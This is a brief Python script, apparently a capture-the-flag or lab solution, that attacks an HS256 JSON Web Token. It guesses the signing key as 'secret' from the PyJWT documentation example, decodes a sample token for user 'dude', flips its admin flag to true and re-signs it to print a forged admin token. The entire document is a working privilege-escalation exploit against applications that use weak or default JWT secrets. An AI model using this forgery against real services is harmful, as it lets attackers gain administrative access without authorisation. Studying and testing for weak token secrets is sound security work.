# from PyJWT readme examples, we observe that, they use "secret" as the key
# referene here: https://pyjwt.readthedocs.io/en/stable/usage.html#encoding-decoding-tokens-with-hs256

import jwt

sample_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImR1ZGUiLCJhZG1pbiI6ZmFsc2V9.laNO8yLFqmyb76bHXid8rni8RHZzN7vmXsUgaOqCce8"

k_secret = "secret"
alg = "HS256"

# decode
dec = jwt.decode(sample_token, k_secret, algorithms=[alg])

# debug
print(dec)

# flip to admin
dec["admin"] = True

# new token
token = jwt.encode(dec, k_secret, algorithm=alg)
print(f"Final Token: {token}")
